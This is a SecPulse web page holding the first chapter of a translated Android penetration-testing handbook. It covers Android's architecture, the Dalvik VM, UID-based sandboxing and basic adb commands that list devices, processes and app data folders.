<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>Android 渗透测试学习手册（一）Android 安全入门 - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="摘要：Android 是当今最流行的智能手机操作系统之一。 随着人气的增加，它存在很多安全风险，这些风险不可避免地被引入到应用程序中，使得用户本身受到威胁。 我们将在本书中以方法论和循序渐进的方式来讨论 Android 应用程序安全性和渗透测试的各个方面。" />
<meta name="keywords" content="Android,Android模拟器,Linux 移植,META-INF,shell,数据库,浏览器渲染引擎,渗透 Android,渗透测试,虚拟环境" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/55996.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-55996 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/mobile-security" rel="category tag">移动安全</a> &gt;  正文 </nav><article id="post-55996" class="post-55996 post type-post status-publish format-standard has-post-thumbnail hentry category-mobile-security tag-Android tag-android tag-linux- tag-meta-inf tag-shell tag-13038 tag-63535 tag--android tag-1953 tag-63537">
	<header class="single-header">
		<h1>Android 渗透测试学习手册（一）Android 安全入门</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2017 /2/24 12:22</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">4,561</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/55996.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<blockquote>
<p class="single-intro contextual">摘要：Android 是当今最流行的智能手机操作系统之一。 随着人气的增加，它存在很多安全风险，这些风险不可避免地被引入到应用程序中，使得用户本身受到威胁。 我们将在本书中以方法论和循序渐进的方式来讨论 Android 应用程序安全性和渗透测试的各个方面。</p>
</blockquote>
<div class="single-text">
<div id="content-index-wrap">
<h2 id="content-index"><b>文章目录</b></h2>
<ul id="index-ul">
<li>1.1 Android 简介</li>
<li>1.2 深入了解 Android</li>
<li>1.3 沙箱和权限模型</li>
<li>1.4 应用签名</li>
<li>1.5 Android 启动流程</li>
</ul>
<p>&nbsp;</p>
</div>
<blockquote><p><a href="https://www.secpulse.com/archives/tag/Android" target="_blank">Android</a> 是当今最流行的智能手机操作系统之一。 随着人气的增加，它存在很多安全风险，这些风险不可避免地被引入到应用程序中，使得用户本身受到威胁。 我们将在本书中以方法论和循序渐进的方式来讨论 Android 应用程序安全性和<a href="https://www.secpulse.com/archives/tag/渗透测试" target="_blank">渗透测试</a>的各个方面。</p></blockquote>
<blockquote><p>本章的目标是<strong>为 </strong>Android 安全打下基础，以便在以后的章节中使用。</p></blockquote>
<h2 id="title-0">1.1 Android 简介</h2>
<blockquote><p>自从 Android 被谷歌收购（ 2005 年） ，谷歌已经完成了整个开发，在过去的 9 年里，尤其是在安全方面，有很多变化。 现在，它是世界上最广泛使用的智能手机平台，特别是由于不同的手机制造商，如 LG，三星，索尼和 HTC 的支持。</p></blockquote>
<blockquote><p>Android 的后续版本中引入了许多新概念，例如 Google Bouncer 和 Google App Verifier。 我们将在本章逐一介绍它们。</p></blockquote>
<blockquote><p>如果我们看看 Android 的架构，如下图所示，我们将看到它被分为四个不同的层。 在它的底部是 Linux 内核，它已被修改来在移动环境中获得更好的性能。 Linux 内核还必须与所有硬件组件交互，因此也包含大多数硬件驱动程序。 此外，它负责 Android 中存在的大多数安全功能。 由于 Android 基于 Linux 平台，它还使开发人员易于将 Android 移植到其他平台和架构。 Android 还提供了一个硬件抽象层，供开发人员在 Android 平台栈和他们想要移植的硬件之间创建软件钩子。</p></blockquote>
<blockquote><p>在 Linux 内核之上是一个层级，包含一些最重要和有用的库，如下所示：</p></blockquote>
<div class="bs-callout bs-callout-warning">
<ul>
<li>Surface Manager：管理窗口和屏幕</li>
<li>媒体框架：这允许使用各种类型的编解码器来播放和记录不同的媒体</li>
<li>SQLite：这是一个较轻的 SQL 版本，用于数据库管理</li>
<li>WebKit：这是<a href="https://www.secpulse.com/archives/tag/浏览器渲染引擎" target="_blank">浏览器渲染引擎</a></li>
<li>OpenGL：用于在屏幕上正确显示 2D 和 3D 内容</li>
</ul>
<p>&nbsp;</p>
</div>
<blockquote><p>以下是来自 Android 开发人员网站的 Android 架构的图形表示：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/124.png"><img class="alignnone size-full wp-image-55998" src="http://www.secpulse.com/wp-content/uploads/2017/02/124.png" alt="1" width="640" height="459" /></a></p>
<blockquote><p>Android 中的库是用 C 和 C++ 编写的，其中大多数是从 <a href="https://www.secpulse.com/archives/tag/Linux 移植" target="_blank">Linux 移植</a>的。 与 Linux 相比，Android 中的一个主要区别是，在这里没有 <strong>libc</strong> 库，它用于 Linux 中的大多数任务。 相反，Android 有自己的称为 bionic 的库，我们可以认为它是一个剥离和修改后的，用于 Android的 libc 版本。</p></blockquote>
<blockquote><p>在同一层级，还有来自 Android 运行时 -- Dalvik 虚拟机和核心库的组件。 我们将在本书的下一部分中讨论关于 Dalvik 虚拟机的很多内容。</p></blockquote>
<blockquote><p>在这个层之上，有应用程序框架层，它支持应用程序执行不同类型的任务。</p></blockquote>
<blockquote><p>此外，开发人员创建的大多数应用程序只与第一层和最顶层的应用程序交互。 该架构以一种方式设计，在每个时间点，底层都支持上面的层级。</p></blockquote>
<blockquote><p>早期版本的 Android（&lt;4.0） 基于 Linux 内核 2.6.x，而较新版本基于内核 3.x. 不同的Android 版本和他们使用的 Linux 内核的列表规定如下：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/217.png"><img class="alignnone size-full wp-image-55999" src="http://www.secpulse.com/wp-content/uploads/2017/02/217.png" alt="2" width="640" height="271" /></a></p>
<blockquote><p>Android 中的所有应用程序都在<a href="https://www.secpulse.com/archives/tag/虚拟环境" target="_blank">虚拟环境</a>下运行，这称为 Dalvik 虚拟机（ DVM） 。 这里需要注意的一点是，从 Android 4.4 版本开始，还有另一个运行时称为 Android 运行时（ ART） ，用户可以在 DVM 和 ART 运行时环境之间自由切换。</p></blockquote>
<blockquote><p>然而，对于这本书，我们将只关注 Dalvik 虚拟机实现。 它类似于 Java 虚拟机（ JVM） ，除了基于寄存器的特性，而不是基于堆栈的特性。 因此，运行的每个应用程序都将在自己的 Dalvik 虚拟机实例下运行。 因此，如果我们运行三个不同的应用程序，将有三个不同的虚拟实例。 现在，这里的重点是，即使它为应用程序创建一个虚拟环境来运行，它不应该与安全容器或安全环境混淆。 DVM 的主要焦点是与性能相关，而不是与安全性相关。</p></blockquote>
<blockquote><p>Dalvik 虚拟机执行一个名为 <strong>.dex</strong> 或 Dalvik 可执行文件的文件格式。 我们将进一步查看 <strong>.dex</strong> 文件格式，并将在下面的章节中进行分析。 现在让我们继续与 adb 进行交互，并更深入地分析 Android 设备及其体系结构。</p></blockquote>
<h2 id="title-1">1.2 深入了解 Android</h2>
<blockquote><p>如果你有 Android 设备或正在运行<a href="https://www.secpulse.com/archives/tag/Android模拟器" target="_blank">Android模拟器</a>，则可以使用 Android SDK 本身提供的工具（ 称为 adb） 。 我们将在第二章详细讨论 adb。 现在，我们将只设置 SDK，我们已经准备好了。</p></blockquote>
<blockquote><p>一旦设备通过 USB 连接，我们可以在我们的终端中输入 adb，这将显示所连接设备的序列号列表。 请确保你已在设备设置中启用了 USB 调试功能。</p></blockquote>
<div id="crayon-58af8ac08c24f086522074" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c24f086522074-1" class="crayon-line"><span class="crayon-sy">$</span> <span class="crayon-e">adb </span><span class="crayon-e">devices</span></div>
<div id="crayon-58af8ac08c24f086522074-2" class="crayon-line crayon-striped-line"><span class="crayon-e">List </span><span class="crayon-e">of </span><span class="crayon-e">devices</span></div>
<div id="crayon-58af8ac08c24f086522074-3" class="crayon-line"><span class="crayon-v">attachedemulator</span><span class="crayon-o">-</span><span class="crayon-cn">5554</span> <span class="crayon-v">device</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>现在，如我们之前所见，Android 是基于 Linux 内核的，所以大多数 Linux 命令在 Android 上也可以通过 adb shell 完美运行。 adb <a href="https://www.secpulse.com/archives/tag/shell" target="_blank">shell</a> 为你提供与设备的 shell 直接交互，你可以在其中执行命令和执行操作以及分析设备中存在的信息。 为了执行 shell，只需要键入以下命令：</p></blockquote>
<div id="crayon-58af8ac08c25e730484789" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c25e730484789-1" class="crayon-line"><span class="crayon-e">adb </span><span class="crayon-v">shell</span><span class="crayon-sy">.</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>一旦我们在 shell 中，我们可以运行 ps 为了列出正在运行的进程：</p></blockquote>
<blockquote><p>如你所见， ps 将列出当前在 Android 系统中运行的所有进程。 如果仔细看，第一列制定了用户名。 在这里我们可以看到各种用户名，如system ， root ， radio 和一系列以 app_ 开头的用户名。 正如你可能已经猜到的，以system 名称运行的进程由系统拥有， root 作为根进程运行， radio 是与电话和无线电相关的进程， app_ 进程是用户已下载的所有应用程序，安装在他们的设备上并且当前正在运行。 因此，就像在 Linux 中用户确定了当前登录到系统的唯一用户一样，在 Android 中，用户标识了在自己的环境中运行的应用/进程。</p></blockquote>
<blockquote><p>所以，Android 安全模型的核心是 Linux 特权分离。 每次在 Android 设备中启动新应用程序时，都会为其分配唯一的用户 ID（ UID） ，该用户 ID 将之后会属于某些其他预定义组。</p></blockquote>
<blockquote><p>与 Linux 类似，用作命令的所有二进制文件都位于 /system/bin 和 /system /xbin 。 此外，我们从 Play 商店或任何其他来源安装的应用程序数据将位于 /data/data ，而其原始安装文件（ 即 .apk ） 将存储在 /data/app 。 此外，还有一些应用程序需要从 Play 商店购买，而不是只是免费下载。 这些应用程序将存储在 /data/app-private/ 。</p></blockquote>
<blockquote><p>Android 安装包（ APK） 是 Android 应用程序的默认扩展名，它只是一个归档文件，包含应用程序的所有必需文件和文件夹。 我们在后面的章节中将继续对 .apk 文件进行逆向工程。</p></blockquote>
<blockquote><p>现在，让我们访问 /data/data ，看看里面有什么。 这里需要注意的一点是，为了在真实设备上实现，设备需要 <a href="https://www.secpulse.com/archives/tag/root" target="_blank">root</a> 并且必须处于 su 模式：</p></blockquote>
<div id="crayon-58af8ac08c265521096973" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
<div class="crayon-num crayon-striped-num">4</div>
<div class="crayon-num">5</div>
<div class="crayon-num crayon-striped-num">6</div>
<div class="crayon-num">7</div>
<div class="crayon-num crayon-striped-num">8</div>
<div class="crayon-num">9</div>
<div class="crayon-num crayon-striped-num">10</div>
<div class="crayon-num">11</div>
<div class="crayon-num crayon-striped-num">12</div>
<div class="crayon-num">13</div>
<div class="crayon-num crayon-striped-num">14</div>
<div class="crayon-num">15</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c265521096973-1" class="crayon-line"><span class="crayon-p"># cd /data/data</span></div>
<div id="crayon-58af8ac08c265521096973-2" class="crayon-line crayon-striped-line"><span class="crayon-p"># ls</span></div>
<div id="crayon-58af8ac08c265521096973-3" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">aditya</span><span class="crayon-sy">.</span><span class="crayon-e">facebookapp</span></div>
<div id="crayon-58af8ac08c265521096973-4" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">aditya</span><span class="crayon-sy">.</span><span class="crayon-e">spinnermenu</span></div>
<div id="crayon-58af8ac08c265521096973-5" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">aditya</span><span class="crayon-sy">.</span><span class="crayon-e">zeropermission</span></div>
<div id="crayon-58af8ac08c265521096973-6" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">afe</span><span class="crayon-sy">.</span><span class="crayon-e">socketapp</span></div>
<div id="crayon-58af8ac08c265521096973-7" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">backupconfirm</span></div>
<div id="crayon-58af8ac08c265521096973-8" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">browser</span></div>
<div id="crayon-58af8ac08c265521096973-9" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">calculator2</span></div>
<div id="crayon-58af8ac08c265521096973-10" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">calendar</span></div>
<div id="crayon-58af8ac08c265521096973-11" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">camera</span></div>
<div id="crayon-58af8ac08c265521096973-12" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">certinstaller</span></div>
<div id="crayon-58af8ac08c265521096973-13" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">classic</span></div>
<div id="crayon-58af8ac08c265521096973-14" class="crayon-line crayon-striped-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-e">contacts</span></div>
<div id="crayon-58af8ac08c265521096973-15" class="crayon-line"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">customlocale2</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>所以，我们可以在这里看到，例如， <strong>com.aditya.facebookapp </strong>，是单独的应用程序文件夹。</p></blockquote>
